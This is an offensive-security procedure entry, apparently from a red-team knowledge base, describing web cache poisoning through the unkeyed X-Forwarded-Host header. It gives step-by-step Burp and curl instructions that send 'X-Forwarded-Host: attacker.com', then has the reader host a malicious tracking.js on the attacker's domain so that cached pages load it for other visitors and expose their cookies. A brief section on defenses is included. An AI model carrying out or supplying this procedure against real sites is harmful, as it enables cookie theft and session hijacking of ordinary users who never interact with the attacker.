---
id: d719ca64-527b-4789-a71d-8bc9a5fa0666
name: Web-Cache-Poisoning-With-an-Unkeyed-Header
type: procedure
verified: true
submitted: true
created_at: '2020-08-18T15:53:49.105443+00:00'
updated_at: '2023-05-26T01:23:39.090333+00:00'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - web-cache-poisoning
  - web-applications
  - xss
commands:
  - '[[commands/curl-cache-poisoning-request]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Web-Cache-Poisoning-With-an-Unkeyed-Header

## Summary

This procedure exploits a web cache poisoning vulnerability by manipulating an unkeyed header, such as X-Forwarded-Host, to poison the cache with a malicious JavaScript payload. The attack allows an attacker to inject and cache a script that steals user cookies via an alert when victims load the affected page, bypassing normal caching keys and enabling reflected XSS-like behavior across multiple users.

## Description

Web cache poisoning occurs when a caching proxy or CDN fails to properly key cache entries based on certain headers, allowing attackers to manipulate cached responses. In this case, the unkeyed X-Forwarded-Host header influences URL resolution in the response (e.g., turning relative script imports into absolute URLs pointing to attacker-controlled resources). By crafting requests that poison the cache for a shared resource like a JavaScript file, the attacker can serve malicious content to subsequent users. This technique targets public-facing web applications with reverse proxies or CDNs that mishandle headers, leading to cache pollution and potential session hijacking through cookie theft. The procedure assumes the target uses a vulnerable caching setup and requires the attacker to control a domain for hosting the malicious JS.

## Requirements

1. Access to Burp Suite or equivalent proxy tool for intercepting and modifying HTTP requests.
2. Control over an external domain or server to host the malicious JavaScript file (e.g., attacker.com/resources/js/tracking.js).
3. Network access to the target web application, typically over HTTP/HTTPS on standard ports (80/443).
4. Knowledge of the target's resource paths, such as /resources/js/tracking.js, which is imported in the homepage.
5. A victim user or way to observe cache hits (e.g., via logs or repeated requests).

## Defense

Defensive measures and detection strategies:

- Key all headers that can influence response content in cache policies, ensuring X-Forwarded-Host is included in the cache key.
- Implement strict Content-Security-Policy (CSP) headers to block inline scripts and untrusted domains.
- Use cache-busting techniques or vary cache keys based on user-specific data.
- Monitor for anomalous cache hits with suspicious response variations and log header manipulations.
- Regularly audit caching configurations in CDNs/proxies (e.g., Varnish, CloudFront) for unkeyed header risks.

## Objectives

1. Identify and exploit an unkeyed header to poison the web cache.
2. Inject a malicious JavaScript payload into a cached resource.
3. Achieve cookie theft for victims loading the poisoned cache entry.
4. Verify successful poisoning through cache hit responses and payload execution.

## Instructions

### Step 1: Intercept and Forward Initial Request to Repeater

**Context**: Start by capturing the normal GET request for the target's homepage to establish a baseline. This allows modification in Burp Repeater without affecting live traffic. The goal is to observe how the application responds to the unkeyed header.

**Tool Reference**: Use [[tools/Burp-Suite]] Proxy to intercept traffic.

> Configure Burp to proxy your browser traffic, load the target's homepage, locate the GET request in Proxy > HTTP history, and right-click to send it to Repeater. This isolates the request for manipulation.

### Step 2: Add Cache-Buster Parameter

**Context**: Append a unique query parameter to prevent the request from hitting an existing cache entry, ensuring your modified request creates a new cacheable response. This step forces the server to generate fresh content influenced by the unkeyed header.

**Instructions**: In Burp Repeater, modify the request URL by adding ?cb=1234 (or a random value like ?cb=$(date +%s)) to the end of the homepage path.

> Example modified URL: https://target.com/?cb=1234

### Step 3: Inject Unkeyed Header for URL Manipulation

**Context**: Add the X-Forwarded-Host header to trick the server into resolving relative URLs (e.g., <script src="/resources/js/tracking.js">) as absolute URLs from your controlled domain. This poisons the cache by associating the response with attacker-controlled content.

**Command** ([[commands/curl-cache-poisoning-request]]):
```bash
curl -X GET "https://target.com/?cb=1234" \
  -H "X-Forwarded-Host: attacker.com" \
  -H "User-Agent: Mozilla/5.0 (compatible; PoisonTest/1.0)" \
  --proxy http://127.0.0.1:8080
```

> This curl command simulates the request via Burp proxy (port 8080). The X-Forwarded-Host header causes the server to rewrite the script src to http://attacker.com/resources/js/tracking.js. Replay in Burp Repeater for GUI control, or use curl for scripting. Expected: The response includes the rewritten script tag pointing to your domain.

### Step 4: Replay and Confirm Cache Poisoning

**Context**: Send the modified request multiple times to populate the cache. Look for cache hit indicators in the response headers, confirming the poisoned entry is stored and will be served to victims.

**Instructions**: In Burp Repeater, click "Send" repeatedly (every few seconds). Inspect the response headers for X-Cache: HIT (or similar, depending on the proxy/CDN like Varnish or Akamai).

> If using curl, pipe output to grep: curl ... | grep -i "x-cache"

### Step 5: Serve Malicious Payload from Controlled Resource

**Context**: On your attacker server, host the poisoned JS file at the expected path (/resources/js/tracking.js) with the malicious payload. This ensures victims receive and execute the script when hitting the cache.

**Code Reference**: Embed the payload [[codes/JavaScript-Cookie-Theft-via-Alert]] in your hosted tracking.js file.

**Instructions**: Upload the JS file to your server at attacker.com/resources/js/tracking.js containing the alert payload. Ensure your server responds with Content-Type: application/javascript.

### Step 6: Verify Poisoning on Victim

**Context**: Test the attack by simulating a victim request without modifications. The cache should serve the poisoned JS, triggering the alert with cookies.

**Instructions**: Clear your cache or use a new browser session, load the homepage, and check browser console/developer tools for the alert popping up with document.cookie contents. Repeat requests from different IPs to confirm shared cache poisoning.

> Success is indicated by the alert executing without direct attacker interaction, proving cache pollution.

## Expected Output

- Response headers showing X-Cache: HIT after initial replays.
- Browser alert displaying cookie values (e.g., alert("sessionid=abc123; user=admin")) on victim load.
- Network tab in dev tools showing JS loaded from attacker.com instead of target.com.
